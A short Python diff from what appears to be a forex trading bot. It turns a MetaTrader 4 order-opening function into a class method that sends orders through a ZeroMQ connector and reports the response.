-def mt4_open_trade(new_dic):
-    '''
-        Opens new trade.
-    '''
-    new_trade = MT_connector._generate_default_order_dict()
-    new_trade['_symbol'] = new_dic['symbol']
-    if new_dic['buy_sell'] == 'SELL':
-        new_trade['_type'] = 1
-    new_trade['_SL'] = new_dic['stop']
-    new_trade['_TP'] = new_dic['limit']
-    new_trade['_lots'] = lot_size
-    if new_dic['provider'] == 1:
+    def mt4_open_trade(self, new_dic):
+        new_trade = self.zmq._generate_default_order_dict()
+        new_trade['_symbol'] = new_dic['symbol']
+        if new_dic['buy_sell'] == 'SELL':
+            new_trade['_type'] = 1
+        new_trade['_SL'] = new_dic['stop']
+        new_trade['_TP'] = new_dic['limit']
+        new_trade['_lots'] = self.lot_size
+        new_trade['_comment'] = new_dic['provider']
         new_trade['_magic'] = 2020
-    elif new_dic['provider'] == 2:
-        new_trade['_magic'] = 2022
 
-    print(new_trade)
-    MT_connector._DWX_MTX_NEW_TRADE_(_order=new_trade)
-    time.sleep(0.5)
-    jsonR = MT_connector._get_response_()
-    print(jsonR)
-
+        print(new_trade)
+        self.zmq._DWX_MTX_NEW_TRADE_(_order=new_trade)
+        time.sleep(0.5)
+        mt_response = self.zmq._get_response_()
+        print(mt_response)
+        self.send_report(str(mt_response))
 
 vp_start_gui()
-
-
 
 
